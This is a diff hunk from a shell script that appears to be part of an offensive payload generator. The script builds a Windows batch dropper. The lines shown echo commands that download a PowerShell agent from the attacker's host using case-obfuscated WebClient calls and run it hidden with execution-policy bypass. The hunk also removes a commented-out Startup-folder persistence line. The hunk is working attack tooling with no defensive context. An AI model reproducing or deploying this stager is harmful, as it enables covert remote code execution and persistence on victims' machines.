@@ -12377,10 +12377,8 @@ else
       echo "echo Please Wait, Installing $NaM .." >> $IPATH/output/$Drop.$ext.bat
       
       ## Setting target PS to 'RemoteSigned' to be abble to exec our agent.ps1 on Startup
-      # REMARK: delete the PS_warning$=(ZENITY powershell warning now ..it not needed anymore).
-      # REMARK: delete the last line (line 12-387) ---> IF UN-COMMENT THE NEXT TWO LINES <-------
+      # REMARK: delete the last line (line 12-385) ---> IF UN-COMMENT THE NEXT LINE <-------
       # echo "cmd.exe /R echo Y | powershell Set-ExecutionPolicy RemoteSigned -Scope CurrentUser" >> $IPATH/output/$Drop.$ext.bat
-      # echo "echo PoWeRsHeLl.exe -Execution Bypass -WindowStyle Hidden -NoProfile -File \"$rpath\\$NaM.ps1\" > \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Persiste.bat\"" >> $IPATH/output/$Drop.$ext.bat
 
       echo "PoWeRsHeLl.exe -C (nEw-ObJeCt NeT.WebClIeNt).DoWnLoAdFiLe('http://$lhost/$NaM.ps1', '$rpath\\$NaM.ps1')" >> $IPATH/output/$Drop.$ext.bat
       echo "PoWeRsHeLl.exe -Execution Bypass -WindowStyle Hidden -NoProfile -File \"$rpath\\$NaM.ps1\"" >> $IPATH/output/$Drop.$ext.bat
